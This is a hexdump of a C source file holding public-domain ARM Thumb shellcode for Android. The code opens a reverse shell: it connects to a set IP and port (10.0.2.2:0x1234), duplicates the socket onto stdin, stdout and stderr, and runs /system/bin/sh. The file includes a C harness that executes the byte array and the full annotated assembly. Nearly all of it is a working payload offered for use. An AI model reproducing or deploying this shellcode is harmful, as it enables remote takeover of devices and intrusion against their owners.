00000000  2f 2a 20 54 68 69 73 20  41 52 4d 20 54 68 75 6d  |/* This ARM Thum|
00000010  62 20 73 63 20 63 6f 6e  6e 65 63 74 73 20 74 6f  |b sc connects to|
00000020  20 61 20 67 69 76 65 6e  20 49 50 20 61 6e 64 20  | a given IP and |
00000030  70 6f 72 74 20 77 69 74  68 20 61 20 73 68 65 6c  |port with a shel|
00000040  6c 2e 0d 0a 20 2a 20 49  6e 74 65 6e 64 65 64 20  |l... * Intended |
00000050  66 6f 72 20 75 73 65 20  77 69 74 68 20 41 6e 64  |for use with And|
00000060  72 6f 69 64 20 28 68 65  6e 63 65 20 2f 73 79 73  |roid (hence /sys|
00000070  74 65 6d 2f 62 69 6e 2f  73 68 29 2e 0d 0a 20 2a  |tem/bin/sh)... *|
00000080  0d 0a 20 2a 20 43 6f 6e  6e 65 63 74 73 20 74 6f  |.. * Connects to|
00000090  20 74 68 65 20 70 72 6f  76 69 64 65 64 20 49 50  | the provided IP|
000000a0  20 61 6e 64 20 70 6f 72  74 20 77 69 74 68 20 61  | and port with a|
000000b0  20 73 68 65 6c 6c 0d 0a  20 2a 0d 0a 20 2a 20 6e  | shell.. *.. * n|
000000c0  6f 20 6e 75 6c 6c 20 62  79 74 65 73 20 69 6e 20  |o null bytes in |
000000d0  74 68 65 20 63 6f 64 65  2c 20 62 75 74 20 64 6f  |the code, but do|
000000e0  65 73 20 74 68 69 73 20  72 65 61 6c 6c 79 20 6d  |es this really m|
000000f0  61 74 74 65 72 20 74 68  65 73 65 20 64 61 79 73  |atter these days|
00000100  3f 0d 0a 20 2a 20 69 74  20 63 6f 75 6c 64 20 62  |?.. * it could b|
00000110  65 20 66 69 78 65 64 20  77 69 74 68 20 6a 75 73  |e fixed with jus|
00000120  74 20 61 20 66 65 77 20  69 6e 73 74 72 75 63 74  |t a few instruct|
00000130  69 6f 6e 73 2e 0d 0a 20  2a 0d 0a 20 2a 20 52 65  |ions... *.. * Re|
00000140  6c 65 61 73 65 64 20 74  6f 20 74 68 65 20 70 75  |leased to the pu|
00000150  62 6c 69 63 20 64 6f 6d  61 69 6e 20 2a 2f 0d 0a  |blic domain */..|
00000160  0d 0a 23 69 6e 63 6c 75  64 65 20 3c 73 74 64 69  |..#include <stdi|
00000170  6f 2e 68 3e 0d 0a 23 69  6e 63 6c 75 64 65 20 3c  |o.h>..#include <|
00000180  73 74 72 69 6e 67 2e 68  3e 0d 0a 0d 0a 23 64 65  |string.h>....#de|
00000190  66 69 6e 65 20 53 57 41  50 31 36 28 78 29 09 28  |fine SWAP16(x).(|
000001a0  28 78 29 20 3c 3c 20 38  20 7c 20 28 28 78 29 20  |(x) << 8 | ((x) |
000001b0  3e 3e 20 38 29 29 0d 0a  0d 0a 63 6f 6e 73 74 20  |>> 8))....const |
000001c0  75 6e 73 69 67 6e 65 64  20 63 68 61 72 20 73 63  |unsigned char sc|
000001d0  5b 5d 20 3d 20 7b 0d 0a  09 2f 2a 20 45 6e 74 65  |[] = {.../* Ente|
000001e0  72 20 54 68 75 6d 62 20  6d 6f 64 65 20 28 66 6f  |r Thumb mode (fo|
000001f0  72 20 70 72 6f 6f 66 20  6f 66 20 63 6f 6e 63 65  |r proof of conce|
00000200  70 74 29 20 2a 2f 0d 0a  09 30 78 30 31 2c 20 30  |pt) */...0x01, 0|
00000210  78 31 30 2c 20 30 78 38  46 2c 20 30 78 45 32 2c  |x10, 0x8F, 0xE2,|
00000220  20 30 78 31 31 2c 20 30  78 46 46 2c 20 30 78 32  | 0x11, 0xFF, 0x2|
00000230  46 2c 20 30 78 45 31 2c  0d 0a 0d 0a 09 2f 2a 20  |F, 0xE1,...../* |
00000240  31 36 2d 62 69 74 20 69  6e 73 74 72 75 63 74 69  |16-bit instructi|
00000250  6f 6e 73 20 66 6f 6c 6c  6f 77 20 2a 2f 0d 0a 09  |ons follow */...|
00000260  30 78 30 32 2c 20 30 78  32 30 2c 20 30 78 30 31  |0x02, 0x20, 0x01|
00000270  2c 20 30 78 32 31 2c 20  30 78 39 32 2c 20 30 78  |, 0x21, 0x92, 0x|
00000280  31 41 2c 20 30 78 30 46  2c 20 30 78 30 32 2c 20  |1A, 0x0F, 0x02, |
00000290  30 78 31 39 2c 20 30 78  33 37 2c 20 30 78 30 31  |0x19, 0x37, 0x01|
000002a0  2c 0d 0a 09 30 78 44 46  2c 20 30 78 30 36 2c 20  |,...0xDF, 0x06, |
000002b0  30 78 31 43 2c 20 30 78  30 38 2c 20 30 78 41 31  |0x1C, 0x08, 0xA1|
000002c0  2c 20 30 78 31 30 2c 20  30 78 32 32 2c 20 30 78  |, 0x10, 0x22, 0x|
000002d0  30 32 2c 20 30 78 33 37  2c 20 30 78 30 31 2c 20  |02, 0x37, 0x01, |
000002e0  30 78 44 46 2c 0d 0a 09  30 78 33 46 2c 20 30 78  |0xDF,...0x3F, 0x|
000002f0  32 37 2c 20 30 78 30 32  2c 20 30 78 32 31 2c 20  |27, 0x02, 0x21, |
00000300  30 78 33 30 2c 20 30 78  31 63 2c 20 30 78 30 31  |0x30, 0x1c, 0x01|
00000310  2c 20 30 78 64 66 2c 20  30 78 30 31 2c 20 30 78  |, 0xdf, 0x01, 0x|
00000320  33 39 2c 20 30 78 46 42  2c 0d 0a 09 30 78 44 35  |39, 0xFB,...0xD5|
00000330  2c 20 30 78 30 35 2c 20  30 78 41 30 2c 20 30 78  |, 0x05, 0xA0, 0x|
00000340  39 32 2c 20 30 78 31 61  2c 20 30 78 30 35 2c 20  |92, 0x1a, 0x05, |
00000350  30 78 62 34 2c 20 30 78  36 39 2c 20 30 78 34 36  |0xb4, 0x69, 0x46|
00000360  2c 20 30 78 30 62 2c 20  30 78 32 37 2c 0d 0a 09  |, 0x0b, 0x27,...|
00000370  30 78 30 31 2c 20 30 78  44 46 2c 20 30 78 43 30  |0x01, 0xDF, 0xC0|
00000380  2c 20 30 78 34 36 2c 0d  0a 0d 0a 09 2f 2a 20 73  |, 0x46,...../* s|
00000390  74 72 75 63 74 20 73 6f  63 6b 61 64 64 72 20 2a  |truct sockaddr *|
000003a0  2f 0d 0a 09 30 78 30 32  2c 20 30 78 30 30 2c 0d  |/...0x02, 0x00,.|
000003b0  0a 09 2f 2a 20 70 6f 72  74 3a 20 30 78 31 32 33  |../* port: 0x123|
000003c0  34 20 2a 2f 0d 0a 09 30  78 31 32 2c 20 30 78 33  |4 */...0x12, 0x3|
000003d0  34 2c 0d 0a 09 2f 2a 20  69 70 3a 20 31 30 2e 30  |4,.../* ip: 10.0|
000003e0  2e 32 2e 32 20 2a 2f 0d  0a 09 30 78 30 41 2c 20  |.2.2 */...0x0A, |
000003f0  30 78 30 30 2c 20 30 78  30 32 2c 20 30 78 30 32  |0x00, 0x02, 0x02|
00000400  2c 0d 0a 0d 0a 09 2f 2a  20 22 2f 73 79 73 74 65  |,...../* "/syste|
00000410  6d 2f 62 69 6e 2f 73 68  22 20 2a 2f 0d 0a 09 30  |m/bin/sh" */...0|
00000420  78 32 66 2c 20 30 78 37  33 2c 20 30 78 37 39 2c  |x2f, 0x73, 0x79,|
00000430  20 30 78 37 33 2c 20 30  78 37 34 2c 20 30 78 36  | 0x73, 0x74, 0x6|
00000440  35 2c 20 30 78 36 64 2c  20 30 78 32 66 2c 20 30  |5, 0x6d, 0x2f, 0|
00000450  78 36 32 2c 20 30 78 36  39 2c 20 30 78 36 65 2c  |x62, 0x69, 0x6e,|
00000460  0d 0a 09 30 78 32 66 2c  20 30 78 37 33 2c 20 30  |...0x2f, 0x73, 0|
00000470  78 36 38 2c 20 30 78 30  30 0d 0a 7d 3b 0d 0a 0d  |x68, 0x00..};...|
00000480  0a 69 6e 74 20 6d 61 69  6e 28 29 0d 0a 7b 0d 0a  |.int main()..{..|
00000490  09 70 72 69 6e 74 66 28  22 73 68 65 6c 6c 63 6f  |.printf("shellco|
000004a0  64 65 3d 25 64 20 62 79  74 65 73 5c 6e 22 0d 0a  |de=%d bytes\n"..|
000004b0  09 20 20 20 20 20 20 20  22 63 6f 6e 6e 65 63 74  |.       "connect|
000004c0  69 6e 67 20 74 6f 20 25  64 2e 25 64 2e 25 64 2e  |ing to %d.%d.%d.|
000004d0  25 64 3a 25 68 64 5c 6e  22 2c 20 73 69 7a 65 6f  |%d:%hd\n", sizeo|
000004e0  66 20 73 63 2c 0d 0a 09  09 73 63 5b 30 78 33 63  |f sc,....sc[0x3c|
000004f0  5d 2c 20 73 63 5b 30 78  33 64 5d 2c 20 73 63 5b  |], sc[0x3d], sc[|
00000500  30 78 33 65 5d 2c 20 73  63 5b 30 78 33 66 5d 2c  |0x3e], sc[0x3f],|
00000510  0d 0a 09 09 53 57 41 50  31 36 28 2a 28 28 75 6e  |....SWAP16(*((un|
00000520  73 69 67 6e 65 64 20 73  68 6f 72 74 20 2a 29 28  |signed short *)(|
00000530  73 63 2b 30 78 33 61 29  29 29 29 3b 0d 0a 09 72  |sc+0x3a))));...r|
00000540  65 74 75 72 6e 20 28 28  69 6e 74 20 28 2a 29 28  |eturn ((int (*)(|
00000550  76 6f 69 64 29 29 73 63  29 28 29 3b 0d 0a 7d 0d  |void))sc)();..}.|
00000560  0a 0d 0a 2f 2a 0d 0a 20  2a 20 41 73 73 65 6d 62  |.../*.. * Assemb|
00000570  6c 79 20 66 6f 72 20 74  68 6f 73 65 20 77 68 6f  |ly for those who|
00000580  20 61 72 65 20 69 6e 74  65 72 65 73 74 65 64 20  | are interested |
00000590  0d 0a 20 2a 0d 0a 0d 0a  23 20 73 77 69 74 63 68  |.. *....# switch|
000005a0  20 74 6f 20 54 68 75 6d  62 20 6d 6f 64 65 20 28  | to Thumb mode (|
000005b0  31 36 2d 62 69 74 20 6f  70 73 29 20 0d 0a 20 20  |16-bit ops) ..  |
000005c0  20 20 20 20 20 20 2e 63  6f 64 65 20 33 32 0d 0a  |      .code 32..|
000005d0  20 20 20 20 20 20 20 20  61 64 64 20 20 20 20 20  |        add     |
000005e0  72 31 2c 20 70 63 2c 20  23 31 0d 0a 20 20 20 20  |r1, pc, #1..    |
000005f0  20 20 20 20 62 78 20 20  20 20 20 20 72 31 0d 0a  |    bx      r1..|
00000600  0d 0a 23 20 54 68 75 6d  62 20 69 6e 73 74 72 75  |..# Thumb instru|
00000610  63 74 69 6f 6e 73 20 66  6f 6c 6c 6f 77 0d 0a 20  |ctions follow.. |
00000620  20 20 20 20 20 20 20 2e  63 6f 64 65 20 31 36 0d  |       .code 16.|
00000630  0a 0d 0a 23 20 73 6f 63  6b 65 74 28 32 2c 20 31  |...# socket(2, 1|
00000640  2c 20 30 29 0d 0a 20 20  20 20 20 20 20 20 6d 6f  |, 0)..        mo|
00000650  76 20 20 20 20 20 72 30  2c 20 23 32 0d 0a 20 20  |v     r0, #2..  |
00000660  20 20 20 20 20 20 6d 6f  76 20 20 20 20 20 72 31  |      mov     r1|
00000670  2c 20 23 31 0d 0a 20 20  20 20 20 20 20 20 73 75  |, #1..        su|
00000680  62 20 20 20 20 20 72 32  2c 20 72 32 2c 20 72 32  |b     r2, r2, r2|
00000690  0d 0a 20 20 20 20 20 20  20 20 6c 73 6c 20 20 20  |..        lsl   |
000006a0  20 20 72 37 2c 20 72 31  2c 20 23 38 0d 0a 20 20  |  r7, r1, #8..  |
000006b0  20 20 20 20 20 20 61 64  64 20 20 20 20 20 72 37  |      add     r7|
000006c0  2c 20 72 37 2c 20 23 32  35 0d 0a 20 20 20 20 20  |, r7, #25..     |
000006d0  20 20 20 73 76 63 20 20  20 20 20 31 0d 0a 0d 0a  |   svc     1....|
000006e0  23 20 63 6f 6e 6e 65 63  74 28 72 30 2c 20 26 61  |# connect(r0, &a|
000006f0  64 64 72 2c 20 31 36 29  0d 0a 20 20 20 20 20 20  |ddr, 16)..      |
00000700  20 20 6d 6f 76 20 20 20  20 20 72 36 2c 20 72 30  |  mov     r6, r0|
00000710  0d 0a 20 20 20 20 20 20  20 20 61 64 64 20 20 20  |..        add   |
00000720  20 20 72 31 2c 20 70 63  2c 20 23 33 32 0d 0a 20  |  r1, pc, #32.. |
00000730  20 20 20 20 20 20 20 6d  6f 76 20 20 20 20 20 72  |       mov     r|
00000740  32 2c 20 23 31 36 0d 0a  20 20 20 20 20 20 20 20  |2, #16..        |
00000750  61 64 64 20 20 20 20 20  72 37 2c 20 23 32 0d 0a  |add     r7, #2..|
00000760  20 20 20 20 20 20 20 20  73 76 63 20 20 20 20 20  |        svc     |
00000770  31 0d 0a 0d 0a 23 20 64  75 70 32 28 72 30 2c 20  |1....# dup2(r0, |
00000780  30 2f 31 2f 32 29 0d 0a  20 20 20 20 20 20 20 20  |0/1/2)..        |
00000790  6d 6f 76 20 20 20 20 20  72 37 2c 20 23 36 33 0d  |mov     r7, #63.|
000007a0  0a 20 20 20 20 20 20 20  20 6d 6f 76 20 20 20 20  |.        mov    |
000007b0  20 72 31 2c 20 23 32 0d  0a 4c 62 3a 0d 0a 20 20  | r1, #2..Lb:..  |
000007c0  20 20 20 20 20 20 6d 6f  76 20 20 20 20 20 72 30  |      mov     r0|
000007d0  2c 20 72 36 0d 0a 20 20  20 20 20 20 20 20 73 76  |, r6..        sv|
000007e0  63 20 20 20 20 20 31 0d  0a 20 20 20 20 20 20 20  |c     1..       |
000007f0  20 73 75 62 20 20 20 20  20 72 31 2c 20 23 31 0d  | sub     r1, #1.|
00000800  0a 20 20 20 20 20 20 20  20 62 70 6c 20 20 20 20  |.        bpl    |
00000810  20 4c 62 0d 0a 0d 0a 23  20 65 78 65 63 76 65 28  | Lb....# execve(|
00000820  22 2f 73 79 73 74 65 6d  2f 62 69 6e 2f 73 68 22  |"/system/bin/sh"|
00000830  2c 20 5b 22 2f 73 79 73  74 65 6d 2f 62 69 6e 2f  |, ["/system/bin/|
00000840  73 68 22 2c 20 30 5d 2c  20 30 29 20 0d 0a 20 20  |sh", 0], 0) ..  |
00000850  20 20 20 20 20 20 61 64  64 20 20 20 20 20 72 30  |      add     r0|
00000860  2c 20 70 63 2c 20 23 32  30 0d 0a 20 20 20 20 20  |, pc, #20..     |
00000870  20 20 20 73 75 62 20 20  20 20 20 72 32 2c 20 72  |   sub     r2, r|
00000880  32 2c 20 72 32 0d 0a 20  20 20 20 20 20 20 20 70  |2, r2..        p|
00000890  75 73 68 20 20 20 20 7b  72 30 2c 20 72 32 7d 0d  |ush    {r0, r2}.|
000008a0  0a 20 20 20 20 20 20 20  20 6d 6f 76 20 20 20 20  |.        mov    |
000008b0  20 72 31 2c 20 73 70 0d  0a 20 20 20 20 20 20 20  | r1, sp..       |
000008c0  20 6d 6f 76 20 20 20 20  20 72 37 2c 20 23 31 31  | mov     r7, #11|
000008d0  0d 0a 20 20 20 20 20 20  20 20 73 76 63 20 20 20  |..        svc   |
000008e0  20 20 31 0d 0a 0d 0a 23  20 73 74 72 75 63 74 20  |  1....# struct |
000008f0  73 6f 63 6b 61 64 64 72  20 0d 0a 2e 61 6c 69 67  |sockaddr ...alig|
00000900  6e 20 32 0d 0a 2e 73 68  6f 72 74 20 30 78 32 0d  |n 2...short 0x2.|
00000910  0a 2e 73 68 6f 72 74 20  30 78 33 34 31 32 09 23  |..short 0x3412.#|
00000920  20 70 6f 72 74 09 0d 0a  2e 62 79 74 65 20 31 30  | port....byte 10|
00000930  2c 30 2c 32 2c 32 09 23  20 49 50 0d 0a 2e 61 73  |,0,2,2.# IP...as|
00000940  63 69 69 20 22 2f 73 79  73 74 65 6d 2f 62 69 6e  |cii "/system/bin|
00000950  2f 73 68 5c 30 5c 30 22  09 23 20 73 68 65 6c 6c  |/sh\0\0".# shell|
00000960  0d 0a 0d 0a 2a 2a 2a 2f                           |....***/|
00000968
